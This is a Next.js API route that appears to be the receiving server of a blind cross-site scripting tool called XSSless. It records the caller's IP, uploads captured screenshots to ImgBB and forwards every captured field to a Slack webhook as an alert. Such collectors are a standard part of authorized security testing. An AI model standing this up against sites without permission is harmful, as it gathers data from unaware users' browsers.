import { NextRequest, NextResponse } from 'next/server';

export const runtime = 'edge';

export async function POST(req: NextRequest) {
  try {
    const data = await req.json();
    const ip = req.headers.get('x-forwarded-for') || req.headers.get('remote-addr') || 'Unknown';
    data['Remote IP'] = ip;

    const imgbb_api_key = process.env.IMGBB_API_KEY;
    const slack_incoming_webhook = process.env.SLACK_INCOMING_WEBHOOK;

    let screenshotUrl = '';
    if (imgbb_api_key && data['Screenshot']) {
      const encoded = data['Screenshot'].replace('data:image/png;base64,', '');
      const formData = new FormData();
      formData.append('image', encoded);

      try {
        const imgRes = await fetch(`https://api.imgbb.com/1/upload?key=${imgbb_api_key}`, {
          method: 'POST',
          body: formData,
        });
        if (imgRes.ok) {
          const imgOut = await imgRes.json();
          screenshotUrl = imgOut.data?.url_viewer || 'Error parsing ImgBB URL';
        } else {
          screenshotUrl = `ImgBB Error: ${imgRes.status}`;
        }
      } catch (e: any) {
        screenshotUrl = 'Exception: ' + e.message;
      }
    }

    // Generate Alert
    let alert = '*XSSless: Blind XSS Alert*\n';
    for (const [k, v] of Object.entries(data)) {
      if (k === 'Screenshot') continue;
      const value = (v === '' || v === undefined) ? '```None```' : `\n\`\`\`${v}\`\`\``;
      alert += `*${k}:* ${value}\n`;
    }
    if (screenshotUrl) {
      alert += `*Screenshot URL:* \`${screenshotUrl}\`\n`;
    }

    if (slack_incoming_webhook) {
      try {
        await fetch(slack_incoming_webhook, {
          method: 'POST',
          body: JSON.stringify({
            username: 'XLess',
            text: alert,
            mrkdwn: true,
          }),
        });
      } catch (e) {
        console.error('Slack alert failed:', e);
      }
    }

    return new NextResponse('ok\n', {
      status: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
      },
    });
  } catch (error) {
    console.error('Error in /api/c:', error);
    return new NextResponse('Internal Server Error', { status: 500 });
  }
}

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 204,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
}
